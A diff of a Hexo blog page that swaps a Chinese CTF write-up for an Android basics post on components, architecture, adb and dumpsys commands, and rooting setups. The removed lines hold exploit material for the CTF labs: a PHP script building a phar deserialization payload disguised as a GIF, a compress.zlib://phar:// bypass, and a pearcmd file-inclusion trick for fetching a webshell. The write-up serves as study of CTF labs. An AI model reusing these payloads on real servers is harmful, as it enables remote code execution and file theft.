@@ -9,7 +9,7 @@
     
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
   <title>
-    巅峰极客2020 |  
+    安卓之旅-1 |  
   </title>
   <meta name="generator" content="hexo-theme-ayer">
   
@@ -56,7 +56,7 @@
     <main class="content on">
       <section class="outer">
   <article
-  id="post-巅峰极客2020"
+  id="post-安卓之旅-1"
   class="article article-type-post"
   itemscope
   itemprop="blogPost"
@@ -67,26 +67,22 @@
     <header class="article-header">
        
 <h1 class="article-title sea-center" style="border-left:0" itemprop="name">
-  巅峰极客2020
+  安卓之旅-1
 </h1>
  
 
     </header>
      
     <div class="article-meta">
-      <a href="/2020/09/28/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22020/" class="article-date">
-  <time datetime="2020-09-28T07:54:28.000Z" itemprop="datePublished">2020-09-28</time>
-</a> 
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/CTF/">CTF</a>
-  </div>
-  
+      <a href="/2020/10/05/%E5%AE%89%E5%8D%93%E4%B9%8B%E6%97%85-1/" class="article-date">
+  <time datetime="2020-10-05T12:13:35.000Z" itemprop="datePublished">2020-10-05</time>
+</a>   
 <div class="word_count">
     <span class="post-time">
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> Word count:</span>
-            <span class="post-count">628</span>
+            <span class="post-count">1.2k</span>
         </span>
     </span>
 
@@ -95,7 +91,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> Reading time≈</span>
-            <span class="post-count">2 min</span>
+            <span class="post-count">4 min</span>
         </span>
     </span>
 </div>
@@ -110,36 +106,60 @@
   
     <div class="article-entry" itemprop="articleBody">
        
-  <h1 id="2020巅峰极客部分WP"><a href="#2020巅峰极客部分WP" class="headerlink" title="2020巅峰极客部分WP"></a>2020巅峰极客部分WP</h1><p>参考链接:<a target="_blank" rel="noopener" href="https://www.gem-love.com/ctf/2634.html">https://www.gem-love.com/ctf/2634.html</a></p>
-<p>主要不是题目的解答，看了颖奇大佬的文章，再根据自己在做题目的过程中记忆，对题目单纯的进行理论上的复现，原理是一样的</p>
-<h2 id="BabyPhp2"><a href="#BabyPhp2" class="headerlink" title="BabyPhp2"></a>BabyPhp2</h2><p>打开题目</p>
-<p><img src="https://i.loli.net/2020/09/28/V6MiunxmdfpzkEC.png"></p>
-<p>这里提示已经很明显了，这里登陆不上的。</p>
-<p>然后扫目录，得到<a target="_blank" rel="noopener" href="http://www.zip,源码泄漏,然后打开源码,进行源码的分析/">www.zip，源码泄漏，然后打开源码，进行源码的分析</a></p>
-<p><img src="https://i.loli.net/2020/09/28/zUTKC5ySladEGtF.png"></p>
-<p>文件读取的漏洞，但是这个读取方法里面的有waf，魔术方法就需要制造调用，构建POP链。现在就是要找到这个链头了。</p>
-<p><img src="https://i.loli.net/2020/09/28/Xar8jLGyDCcxM2e.png"></p>
-<p>有一个魔术方法之中有修改的内容，可以这里是可以利用，接下来就是想办法将 这个地方包含进来还要执行这条链。剩下的就是<code>file_get_contents</code>这个函数了。利用伪协议将php文件读取进来，还要能够执行。<code>phar</code>伪协议满足要求。但是</p>
-<p><img src="https://i.loli.net/2020/09/28/QN7ylUWLEfZrwCu.png"></p>
-<p>已经被销毁了。这里提醒一下，伪协议是可以联合使用的。</p>
-<p><code>compress.zlib://phar://</code></p>
-<p>这样就可以绕过限制读取文件，再加上那个upload.php上传的时候改一个名字，问题也就解决了。下面贴上大佬的脚本。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class User</span><br><span class="line">&#123;</span><br><span class="line">    public $id;</span><br><span class="line">    public $age&#x3D;null;</span><br><span class="line">    public $nickname&#x3D;null;</span><br><span class="line">    public $backup;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;nickname &#x3D; new Reader();</span><br><span class="line">        $this-&gt;backup &#x3D; &quot;&#x2F;flag&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class dbCtrl</span><br><span class="line">&#123;</span><br><span class="line">    public $token;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;token &#x3D; new User;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Class Reader&#123;</span><br><span class="line">    public $filename;</span><br><span class="line">    public $result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$y1ng &#x3D; new dbCtrl();</span><br><span class="line"></span><br><span class="line">$phar &#x3D; new Phar(&quot;web1.phar&quot;);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);</span><br><span class="line">$phar-&gt;setMetadata($y1ng);</span><br><span class="line">$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"></span><br><span class="line">@rename(&quot;web1.phar&quot;, &quot;y1ng.gif&quot;);</span><br></pre></td></tr></table></figure>
+  <h1 id="Android-1"><a href="#Android-1" class="headerlink" title="Android-1"></a>Android-1</h1><h2 id="一、四大组件与系统架构"><a href="#一、四大组件与系统架构" class="headerlink" title="一、四大组件与系统架构"></a>一、四大组件与系统架构</h2><h3 id="（一）Android四大组件"><a href="#（一）Android四大组件" class="headerlink" title="（一）Android四大组件"></a>（一）Android四大组件</h3><p>1、Activity</p>
+<p>一个Activity通常就是一个单独的窗口。Activity之间通过Intent进行通信。Activity应用中每一个Activity都必须要在AndroidManifest.xml配置文件中声明，否则系统将不识别也不执行该Activity。</p>
+<p>2、Service</p>
+<p>Started（启动）：当应用程序组件（如Activity）调用StartService()方法启动服务时，服务处于Started状态。</p>
+<p>bound（绑定）：当应用程序组件调用bindService()方法绑定到服务时，服务处于bound状态。</p>
+<p>Service通常位于后台运行，它一般不需要与用户交互，因此Service组件没有图形用户界面。Service组件需要继承Service基类。Service组件通常用于为其他组件提供后台服务或监控其他组件的运行状态。</p>
+<p>3、Content provider</p>
+<p>Android平台提供了Content Provider使一个应用程序的指定数据集提供给其他应用程序。其他应用可以通过ContentResolver类从该内容提供者中获取或存入数据。</p>
+<p>只有需要在多个应用程序间共享数据是才需要内容提供者。例如，通讯录数据被多个应用程序使用，且必须存储在一个内容提供者中。它的好处是统一数据访问方式。</p>
+<p>ContentProvider实现数据共享。ContentProvider用于保存和获取数据，并使其对所有应用程序可见。这是不同应用程序间共享数据的唯一方式，因为android没有提供所有应用共同访问的公共存储区。</p>
+<p>开发人员不会直接使用ContentProvider类的对象，大多数是通过ContentResolver对象实现对ContentProvider的操作。5、ContentProvider使用URI来唯一标识其数据集，这里的URI以content://作为前缀，表示该数据由ContentProvider来管理。</p>
+<p>4、Broadcast Receiver</p>
+<p>你的应用可以使用它对外部事件进行过滤，只对感兴趣的外部事件(如当电话呼入时，或者数据网络可用时)进行接收并做出响应。广播接收器没有用户界面。然而，它们可以启动一个activity或serice来响应它们收到的信息，或者用NotificationManager来通知用户。通知可以用很多种方式来吸引用户的注意力，例如闪动背灯、震动、播放声音等。一般来说是在状态栏上放一个持久的图标，用户可以打开它并获取消息。</p>
+<p>广播接收者的注册有两种方法，分别是程序动态注册和AndroidManifest文件中进行静态注册。</p>
+<p>动态注册广播接收器特点是当用来注册的Activity关掉后，广播也就失效了。静态注册无需担忧广播接收器是否被关闭，只要设备是开启状态，广播接收器也是打开着的。也就是说哪怕app本身未启动，该app订阅的广播在触发时也会对它起作用。</p>
+<h3 id="（二）Android系统架构"><a href="#（二）Android系统架构" class="headerlink" title="（二）Android系统架构"></a>（二）Android系统架构</h3><p><code>Android</code>采用分层的架构，分为四层，从高层到底层分为<code>应用程序层</code>（app+System apps），<code>应用程序框架层</code>（Java API Framework），<code>系统运行库和运行环境层</code>(Libraries + android Runtime)和<code>Linux核心层</code>(HAL+ Linux Kernel)</p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ib7IG2SLFIxp1gSuTBlnlR5pWGicpjpHSrNeals6aTv0P8WlrkdabYfpnyJEMmdGb6IRich5PxqKGNg/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1"></p>
+<h3 id="三-Android常用开发与逆向命令总结"><a href="#三-Android常用开发与逆向命令总结" class="headerlink" title="(三) Android常用开发与逆向命令总结"></a>(三) Android常用开发与逆向命令总结</h3><p>1、<code>file</code>查看文件属性</p>
+<p>2、使用<code>echo</code>命令写内容到文件中，然后利用<code>cat</code>读取文件内容。</p>
+<p>3、使用<code>dumpsys</code>命令获取当前顶层<code>activity</code>的信息，grep进行过滤，-i参数忽略大小写。</p>
+<p>4、<code>ls -alit</code>按时间排序显示当前目录全部信息。</p>
+<p>5、<code>dumpsys package com.termux</code>查看该APP内存中的信息</p>
+<p>6、<code>ps -e</code>显示全部进程</p>
+<p><code>ps -e |grep -i termux </code>筛选命令</p>
+<p>7、dumpsys dbinfo com.termux查看数据库信息</p>
+<p>8、<code>adb pull /sdcard/app</code>将手机中的文件拷贝到电脑当前目录下</p>
+<p><code>adb push D:\tmp.txt /sdcard</code>将本地文件放到手机中</p>
+<p>9、<code>adb logcat</code>查看当前日志信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb logcat |grep -i com.termux</span><br></pre></td></tr></table></figure>
 
-<p>之后将gif上传即可</p>
-<p><img src="https://i.loli.net/2020/09/28/2pFyVEOhMnDPSwd.png"></p>
-<p>这里利用是否有序列化的数据出现判断是否协议生效，这样就可以调节文件路径到底是怎样的。</p>
-<p>phar反序列参考链接：<a target="_blank" rel="noopener" href="https://paper.seebug.org/680/">https://paper.seebug.org/680/</a></p>
-<h1 id="MeowWorld"><a href="#MeowWorld" class="headerlink" title="MeowWorld"></a>MeowWorld</h1><p>这道题有个Hint：<code>register_argc_argv</code></p>
-<p>然后这个题很容易看出漏洞是本地文件包含，并且限制了包含的目录，就别想逃出来了。</p>
-<p>然后就是利用pear这个包管理器，下载我们自己的马儿，然后，包含，来命令执行。</p>
-<p><img src="https://i.loli.net/2020/09/28/yDpaCFUfLvwQm2E.png"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;index.php?f&#x3D;&#x2F;usr&#x2F;share&#x2F;pear&#x2F;pearcmd&amp;+list</span><br></pre></td></tr></table></figure>
+<p>10、指定连接某台设备的<code>adb shell</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb -s 192.168.3.18:5555 shell</span><br></pre></td></tr></table></figure>
 
-<p>这个就相当于在本地运行</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pear list</span><br></pre></td></tr></table></figure>
+<p>11、查看某端口对应的进程名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">netstat -tunlp |grep 7001  # 端口</span><br><span class="line">netstat -tunlp |grep &quot;com.termux&quot; # 进程名</span><br><span class="line">netstat -aple |grep -i https #正在通信的端口，查看使用https的通信</span><br></pre></td></tr></table></figure>
 
-<p>这样也就不难猜到提示词的用意了。</p>
+<p>12、<code>htop</code>实时查看手机进程</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pkg install htop</span><br></pre></td></tr></table></figure>
+
+<p>手机<code>root</code>用户查看<code>htop</code>，全部进程</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ su</span><br><span class="line"># &#x2F;data&#x2F;data&#x2F;com.termux&#x2F;files&#x2F;usr&#x2F;bin&#x2F;htop</span><br></pre></td></tr></table></figure>
+
+<p>一本书的链接：<a target="_blank" rel="noopener" href="http://yuedu.163.com/book_reader/581dbb97c3424be08ab582cf64735cde_4">http://yuedu.163.com/book_reader/581dbb97c3424be08ab582cf64735cde_4</a></p>
+<h2 id="二、手机刷机指北"><a href="#二、手机刷机指北" class="headerlink" title="二、手机刷机指北"></a>二、手机刷机指北</h2><p><strong>环境也是分3,6,9等的</strong></p>
+<p><strong>Frida两套环境：</strong></p>
+<p>1、pixel(sailfish)+官方8.1.0_r1+twrp3.3.0+Magisk+Frida</p>
+<p>2、pixel(sailfish)+twrp3.3.0+lineage16.0+addonsu16.0</p>
+<p><strong>Xposed一套环境：</strong></p>
+<p>1、pixel(sailfish)+官方7.1.2_r8+twrp3.2.1-0+SuperSU+XposedInstaller</p>
+<p><strong>Fart同Aosp两套环境：</strong></p>
+<p>1、pixel(sailfish)+最新fastboot+Fart8.1.0</p>
+<p>2、n6p(angler)+老fastboot+Fart8.1.0</p>
+<p><strong>Kali NetHunter一套环境：</strong></p>
+<p>1、n6p(angler)+原生8.1.0_r1+twrp3.3.1+SuperSu</p>
  
       <!-- reward -->
       
@@ -202,12 +222,12 @@
     <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2020/09/28/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22020/" alt="微信分享二维码">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2020/10/05/%E5%AE%89%E5%8D%93%E4%B9%8B%E6%97%85-1/" alt="微信分享二维码">
     </div>
 </div>
 
 <div id="share-mask"></div>  
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Android/" rel="tag">Android</a></li></ul>
 
     </footer>
   </div>
@@ -215,19 +235,19 @@
    
   <nav class="article-nav">
     
-      <a href="/2020/10/05/%E5%AE%89%E5%8D%93%E4%B9%8B%E6%97%85-1/" class="article-nav-link">
+      <a href="/2020/10/06/%E5%AE%89%E5%8D%93%E4%B9%8B%E6%97%85-2/" class="article-nav-link">
         <strong class="article-nav-caption">上一篇</strong>
         <div class="article-nav-title">
           
-            安卓之旅-1
+            安卓之旅-2
           
         </div>
       </a>
     
     
-      <a href="/2020/09/25/%E9%9A%8F%E7%AC%94%E5%B0%8F%E8%AE%B0/" class="article-nav-link">
+      <a href="/2020/09/28/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22020/" class="article-nav-link">
         <strong class="article-nav-caption">下一篇</strong>
-        <div class="article-nav-title">随笔小记</div>
+        <div class="article-nav-title">巅峰极客2020</div>
       </a>
     
   </nav>
